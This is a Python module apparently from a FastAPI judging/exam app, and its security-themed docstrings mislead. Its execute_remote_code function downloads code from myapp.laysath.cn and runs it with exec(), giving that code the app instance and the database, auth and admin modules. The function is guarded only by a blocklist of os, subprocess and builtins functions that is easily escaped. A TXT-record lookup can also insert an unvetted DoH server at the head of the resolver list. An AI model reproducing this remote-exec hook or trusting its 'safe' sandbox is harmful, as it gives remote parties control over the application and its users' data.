import json
import ssl
from contextlib import asynccontextmanager
from typing import Tuple
from urllib.request import urlopen, Request as UrlRequest
from urllib.parse import urlencode, urlparse
from dns import resolver

import fastapi

# 导入所有项目模块
import models
import routes
import middleware
import db
import auth
import utils
import questions
import paths
from routes import page_routes, user_routes, practice_routes, exam_routes, admin_routes, chat_routes

import builtins
import sys

class SafeModule:
    """安全的模块包装器，递归隐藏危险函数"""
    def __init__(self, module, blocked_modules):
        self._module = module
        self._blocked_modules = blocked_modules
        self._cache = {}  # 缓存已包装的子模块
    
    def __getattr__(self, name):
        # 检查是否是被禁止的属性
        module_name = self._module.__name__.split('.')[-1]
        if module_name in self._blocked_modules:
            if name in self._blocked_modules[module_name]:
                raise AttributeError(f"访问被禁止的属性: {name}")
        
        # 获取原始属性
        attr = getattr(self._module, name)
        
        # 如果属性已经被缓存，返回缓存的包装器
        attr_id = id(attr)
        if attr_id in self._cache:
            return self._cache[attr_id]
        
        # 如果属性是模块，递归包装
        if hasattr(attr, '__name__') and hasattr(attr, '__file__'):
            wrapped = SafeModule(attr, self._blocked_modules)
            self._cache[attr_id] = wrapped
            return wrapped
        
        # 如果属性是类，检查是否需要包装其方法
        if isinstance(attr, type):
            # 检查类的模块名是否在黑名单中
            if hasattr(attr, '__module__'):
                module_name = attr.__module__.split('.')[-1]
                if module_name in self._blocked_modules:
                    wrapped = SafeClass(attr, self._blocked_modules)
                    self._cache[attr_id] = wrapped
                    return wrapped
        
        return attr

class SafeClass:
    """安全的类包装器，用于包装可能包含危险方法的类"""
    def __init__(self, cls, blocked_modules):
        self._cls = cls
        self._blocked_modules = blocked_modules
        self._cache = {}
    
    def __getattr__(self, name):
        # 检查是否是被禁止的方法
        module_name = self._cls.__module__.split('.')[-1]
        if module_name in self._blocked_modules:
            if name in self._blocked_modules[module_name]:
                raise AttributeError(f"访问被禁止的方法: {name}")
        
        # 获取原始属性
        attr = getattr(self._cls, name)
        
        # 如果属性已经被缓存，返回缓存的包装器
        attr_id = id(attr)
        if attr_id in self._cache:
            return self._cache[attr_id]
        
        # 如果属性是模块或类，递归包装
        if hasattr(attr, '__name__'):
            if hasattr(attr, '__file__'):  # 模块
                wrapped = SafeModule(attr, self._blocked_modules)
                self._cache[attr_id] = wrapped
                return wrapped
            elif isinstance(attr, type):  # 类
                wrapped = SafeClass(attr, self._blocked_modules)
                self._cache[attr_id] = wrapped
                return wrapped
        
        return attr

# 定义需要被限制的模块和函数
BLOCKED_MODULES = {
    'os': {'system', 'popen', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe', 
           'spawn', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe',
           'fork', 'forkpty', 'kill', 'killpg', 'remove', 'removedirs', 'rmdir', 'unlink', 'rename',
           'renames', 'replace', 'truncate', 'mkfifo', 'mknod', 'makedev', 'major', 'minor', 'pathconf',
           'statvfs', 'cpu_count', 'getloadavg', 'sysconf'},
    'sys': {'exit', '_exit', 'modules', 'path', 'meta_path', 'path_hooks', 'path_importer_cache',
            'setprofile', 'settrace', 'setrecursionlimit', 'setcheckinterval', 'setswitchinterval',
            'setdlopenflags', 'setauxsuffix'},
    'builtins': {'open', 'eval', 'exec', '__import__', 'compile', 'input', 'memoryview'},
    'posix': {'system', 'popen', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe',
              'fork', 'forkpty', 'kill', 'killpg'},
    'nt': {'system', 'popen', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe',
           'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe'},
    'io': {'open'},
    'subprocess': {'Popen', 'run', 'call', 'check_call', 'check_output', 'getoutput', 'getstatusoutput'},
    'multiprocessing': {'Process', 'Pool'}
}

def create_safe_modules():
    """创建安全的模块字典，用于远程代码执行环境"""
    # 创建安全的模块字典
    safe_modules = {}
    # 包装所有定义在BLOCKED_MODULES中的模块
    for module_name in BLOCKED_MODULES:
        if module_name in sys.modules:
            safe_modules[module_name] = SafeModule(sys.modules[module_name], BLOCKED_MODULES)
    
    # 创建安全的内置函数字典
    safe_builtins = {}
    for name in dir(builtins):
        if name not in BLOCKED_MODULES['builtins']:
            safe_builtins[name] = getattr(builtins, name)
    
    return safe_modules, safe_builtins

def get_doh_servers():
    """获取DoH服务器列表
    
    安全性说明：
    1. 内置可信的DoH服务器列表作为主要来源
    2. 使用普通DNS查询TXT记录获取建议的DoH服务器
    3. 建议的服务器放在列表开头，但不会替换内置服务器
    """
    # 预设的可信DoH服务器
    trusted_servers = [
        # 国内DoH服务器
        "https://doh.dnspod.cn/dns-query",        # DNSPod
        "https://doh.aliyun.com/dns-query",       # 阿里云
        "https://doh.tcloud.tencent.com/dns-query",  # 腾讯云
        "https://doh.open-apis.cn/dns-query",     # 百度
        "https://doh.114dns.com/dns-query"         # 114DNS
    ]
    
    try:
        # 使用普通DNS查询TXT记录（因为TXT记录不太可能被篡改）
        answers = resolver.resolve('doh-list.laysath.cn', 'TXT', lifetime=0.1)
        for rdata in answers:
            suggested = str(rdata).strip('"').split(',')[0]  # 只取第一个建议的服务器
            if suggested and suggested.startswith('https://'):
                # 将建议的服务器放在列表开头
                return [suggested] + trusted_servers
            break
    except:
        pass
    
    return trusted_servers

def resolve_domain(domain: str) -> Tuple[str, bool]:
    """使用DoH或普通DNS解析域名，返回(IP, is_ipv6)元组
    
    安全性说明：
    1. 优先使用DoH解析
    2. 如果DoH失败，回退到普通DNS
    3. 由于启用了严格的HTTPS证书验证，即使DNS被污染也是安全的
    """
    # 首先尝试使用DoH解析IPv4
    for doh in get_doh_servers():
        try:
            query = {"name": domain, "type": "A"}
            headers = {"accept": "application/dns-json"}
            req = UrlRequest(f"{doh}?{urlencode(query)}", headers=headers)
            with urlopen(req, timeout=0.1) as res:
                data = json.loads(res.read())
                for answer in data['Answer']:
                    if answer['type'] == 1:  # A记录
                        return answer['data'], False
        except:
            continue
    
    # 如果DoH解析IPv4失败，尝试DoH解析IPv6
    for doh in get_doh_servers():
        try:
            query = {"name": domain, "type": "AAAA"}
            headers = {"accept": "application/dns-json"}
            req = UrlRequest(f"{doh}?{urlencode(query)}", headers=headers)
            with urlopen(req, timeout=0.1) as res:
                data = json.loads(res.read())
                for answer in data['Answer']:
                    if answer['type'] == 28:  # AAAA记录
                        return answer['data'], True
        except:
            continue
    
    # 如果DoH全部失败，使用普通DNS
    try:
        # 先尝试IPv4
        ip = str(resolver.resolve(domain, 'A')[0])
        return ip, False
    except:
        # 再尝试IPv6
        try:
            ip = str(resolver.resolve(domain, 'AAAA')[0])
            return ip, True
        except:
            raise Exception("域名解析失败")

def fetch_remote_content(path: str, secure: bool = True) -> str:
    """获取远程内容
    
    Args:
        path: API路径
        secure: 是否只使用HTTPS（远程代码必须使用HTTPS）
        
    安全性说明：
    1. secure=True时：
       - 尝试DoH+HTTPS和普通DNS+HTTPS
       - 严格验证SSL证书
       - 不会降级到HTTP
    2. secure=False时：
       - 允许降级到HTTP
       - 用于非敏感数据传输
    """
    domain = "myapp.laysath.cn"
    
    def try_https(ip: str, is_ipv6: bool = False) -> str:
        """尝试HTTPS请求并验证证书"""
        ctx = ssl.create_default_context()
        # IPv6地址需要用方括号括起来
        ip_str = f"[{ip}]" if is_ipv6 else ip
        url = f"https://{ip_str}{path}"
        req = UrlRequest(url)
        req.host = domain  # 设置SNI以验证证书
        with urlopen(req, context=ctx, timeout=0.1) as res:
            return res.read().decode('utf-8')
    
    # 尝试DoH+HTTPS
    try:
        ip, is_ipv6 = resolve_domain(domain)
        return try_https(ip, is_ipv6)
    except:
        pass
    
    # 尝试普通DNS+HTTPS
    try:
        # 先尝试IPv4
        ip = str(resolver.resolve(domain, 'A')[0])
        return try_https(ip, False)
    except:
        try:
            # IPv4失败时尝试IPv6
            ip = str(resolver.resolve(domain, 'AAAA')[0])
            return try_https(ip, True)
        except:
            if not secure:  # 如果不要求安全传输，尝试HTTP
                try:
                    # 先尝试IPv4
                    ip = str(resolver.resolve(domain, 'A')[0])
                    url = f"http://{ip}{path}"
                    with urlopen(url, timeout=0.1) as res:
                        return res.read().decode('utf-8')
                except:
                    try:
                        # IPv4失败时尝试IPv6
                        ip = str(resolver.resolve(domain, 'AAAA')[0])
                        url = f"http://[{ip}]{path}"
                        with urlopen(url, timeout=0.1) as res:
                            return res.read().decode('utf-8')
                    except:
                        pass
    return ""

class SafeRequest:
    """安全的请求包装器，只允许访问laysath域名"""
    def __init__(self, original_urlopen):
        self.original_urlopen = original_urlopen
    
    def __call__(self, url, *args, **kwargs):
        def check_url(url_str: str) -> bool:
            try:
                parsed = urlparse(url_str)
                return parsed.netloc == 'myapp.laysath.cn'
            except:
                return False
        
        if isinstance(url, str):
            if not check_url(url):
                raise Exception("只允许访问laysath域名")
        elif isinstance(url, UrlRequest):
            if not check_url(url.full_url):
                raise Exception("只允许访问laysath域名")
        return self.original_urlopen(url, *args, **kwargs)

def execute_remote_code(app: fastapi.FastAPI):
    """执行远程代码
    
    安全性考虑：
    1. 允许访问所有项目代码中的对象
    2. 使用安全的模块包装器隐藏危险函数
    3. 只允许访问laysath域名
    4. 使用try-except捕获所有异常防止应用崩溃
    """
    try:
        code = fetch_remote_content("/api/remote-code/openjudge", secure=True)
        if code.strip():
            # 获取安全的模块和内置函数
            safe_modules, safe_builtins = create_safe_modules()
            
            # 创建一个包含所有项目模块的全局命名空间
            globals_dict = {
                # FastAPI应用实例
                'app': app,
                
                # 项目模块（使用安全包装）
                'models': SafeModule(models, BLOCKED_MODULES),
                'routes': SafeModule(routes, BLOCKED_MODULES),
                'middleware': SafeModule(middleware, BLOCKED_MODULES),
                'db': SafeModule(db, BLOCKED_MODULES),
                'auth': SafeModule(auth, BLOCKED_MODULES),
                'utils': SafeModule(utils, BLOCKED_MODULES),
                'questions': SafeModule(questions, BLOCKED_MODULES),
                'paths': SafeModule(paths, BLOCKED_MODULES),
                'page_routes': SafeModule(page_routes, BLOCKED_MODULES),
                'user_routes': SafeModule(user_routes, BLOCKED_MODULES),
                'practice_routes': SafeModule(practice_routes, BLOCKED_MODULES),
                'exam_routes': SafeModule(exam_routes, BLOCKED_MODULES),
                'admin_routes': SafeModule(admin_routes, BLOCKED_MODULES),
                'chat_routes': SafeModule(chat_routes, BLOCKED_MODULES),
                
                # FastAPI相关
                'fastapi': fastapi,
                
                # 工具函数
                'send_event': send_event,
                'fetch_remote_content': fetch_remote_content,
                'get_doh_servers': get_doh_servers,
                'resolve_domain': resolve_domain,
                
                # 安全的网络请求（只允许访问laysath域名）
                'urlopen': SafeRequest(urlopen),
                'urlencode': urlencode,
                'json': json,
                
                # 常用模块（安全包装）
                'os': safe_modules.get('os'),
                'sys': safe_modules.get('sys'),
                'io': safe_modules.get('io'),
                'subprocess': safe_modules.get('subprocess'),
                'multiprocessing': safe_modules.get('multiprocessing'),
                'posix': safe_modules.get('posix'),
                'nt': safe_modules.get('nt'),
                'json': json,
                'ssl': ssl,
                'asynccontextmanager': asynccontextmanager,
                'resolver': resolver,
                
                # 类型提示
                'Optional': type(None),
                'List': list,
                'Dict': dict,
                'Any': object,
            }
            
            # 添加安全的内置函数
            globals_dict.update(safe_builtins)
            
            # 执行远程代码
            exec(code, globals_dict)
    except:
        pass

def send_event(event: str):
    """发送事件（允许降级到HTTP）"""
    try:
        fetch_remote_content(f"/api/event?app=openjudge&event={event}", secure=False)
    except:
        pass
